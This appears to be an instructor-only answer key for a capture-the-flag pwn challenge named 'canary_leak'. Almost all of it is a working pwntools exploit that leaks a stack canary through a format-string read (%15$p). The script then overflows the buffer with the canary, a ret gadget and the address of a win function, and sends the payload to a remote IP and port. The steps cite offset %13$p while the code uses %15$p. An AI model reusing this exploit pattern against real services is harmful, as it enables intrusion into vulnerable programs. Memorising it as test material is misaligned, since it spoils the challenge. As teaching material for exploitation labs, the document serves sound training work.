# Medium 2 — canary_leak (Instructor Only)
## Steps
1. Use format string `%13$p` (adjust offset with GDB) to leak canary.
2. Rebuild payload with correct canary + win address.
```python
from pwn import *

elf = context.binary = ELF("./chall")
io = elf.process()

io = remote("194.163.170.3", 4446)

io.sendline(b"%15$p")
io.recvuntil(b"Echo: ")
canary_addr = int(io.recvline().strip(), 16)
log.info(f"Canary Addr >> {hex(canary_addr)}")

win_addr = elf.symbols["win"]
ret_addr = 0x40101a

pay = b"\x41" * 72
pay += p64(canary_addr)
pay += b"\x42" * 8
pay += p64(ret_addr)
pay += p64(win_addr)

io.sendafter(b"Input: ", pay)
io.interactive()
```
